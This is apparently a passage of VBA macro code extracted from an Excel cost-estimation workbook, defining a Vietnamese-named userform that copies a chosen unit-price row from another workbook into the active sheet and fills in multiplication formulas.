    Case Else
End Select
End Sub
Attribute VB_Name = "frmChonDonGia"
Attribute VB_Base = "0{69E794D6-6FB9-43E2-8DE4-8779C9D7E893}{69E3D23A-8C0B-4773-93A5-BA427076621F}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Sub cmdChon_Click()
   tenfile = Mid(Sheet5.Range("cdfiledgrieng"), InStrRev(Sheet5.Range("cdfiledgrieng"), "\") + 1)
   filedgrieng = Mid(tenfile, 1, InStrRev(tenfile, ".") - 1)
   dongiarows = LsbChonDonGia.ListIndex + Application.Workbooks(filedgrieng).Sheets("dutoan").Range("dtdulieu").Row
   donghienthoi = ActiveCell.Row
If Right(Me.Caption, 1) = "+" Then
    Rows(donghienthoi + 1).Insert
    donghienthoi = donghienthoi + 1
End If
Cells(donghienthoi, 2).Value = Application.Workbooks(filedgrieng).Sheets("dutoan").Cells(dongiarows, 2)
Cells(donghienthoi, 3).Value = Application.Workbooks(filedgrieng).Sheets("dutoan").Cells(dongiarows, 3)
Cells(donghienthoi, 4).Value = Application.Workbooks(filedgrieng).Sheets("dutoan").Cells(dongiarows, 4)
Cells(donghienthoi, 5).Value = Application.Workbooks(filedgrieng).Sheets("dutoan").Cells(dongiarows, 5)
For I = 14 To 23
   Cells(donghienthoi, I).Value = Application.Workbooks(filedgrieng).Sheets("dutoan").Cells(dongiarows, I)
Next
            Cells(donghienthoi, 24).FormulaR1C1 = "=RC[-11]*RC[-4]"
            Cells(donghienthoi, 25).FormulaR1C1 = "=product(RC[-12]*RC[-4],RC[-2])"
            Cells(donghienthoi, 26).FormulaR1C1 = "=product(RC[-13]*RC[-4],RC[-3])"
            Cells(donghienthoi, 30).FormulaR1C1 = "=RC[-17]*RC[-3]"
            Cells(donghienthoi, 31).FormulaR1C1 = "=RC[-18]*RC[-3]"
            Cells(donghienthoi, 32).FormulaR1C1 = "=RC[-19]*RC[-3]"
            Cells(donghienthoi, 34).FormulaR1C1 = "=RC[-21]*RC[-1]"
'ActiveCell.Value = Application.Workbooks(filedgrieng).Sheets("dutoan").Cells(dongiarows, 4)
Cells(donghienthoi, 4).Select
Me.Caption = Me.Caption + "+"
End Sub

Private Sub cmdThoat_Click()
Unload frmChonDonGia
End Sub

Private Sub LsbChonDonGia_Click()

End Sub

Private Sub LsbChonDonGia_DblClick(ByVal Cancel As MSForms.ReturnBoolean)
Me.cmdChon_Click
End Sub

Private Sub UserForm_Initialize()
Me.Width = ActiveWindow.Width / 3 * 2
Me.Height = ActiveWindow.Height / 3 * 2
LsbChonDonGia.Width = Me.Width - 100
LsbChonDonGia.Height = Me.Height
Me.Height = LsbChonDonGia.Height + 25
cmdChon.Left = Me.Width - 90
cmdChon.Top = Me.Height - 90
cmdThoat.Left = cmdChon.Left
cmdThoat.Top = cmdChon.Top + 30
End Sub
Attribute VB_Name = "myMsgBox"
Attribute VB_Base = "0{F07904DF-1F0E-4CB9-B128-0196254B2120}{5555EA2F-0C2E-47AC-B523-3C8546C9BCA7}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Private Sub UserForm_Click()

End Sub


INQUEST-PP=macro
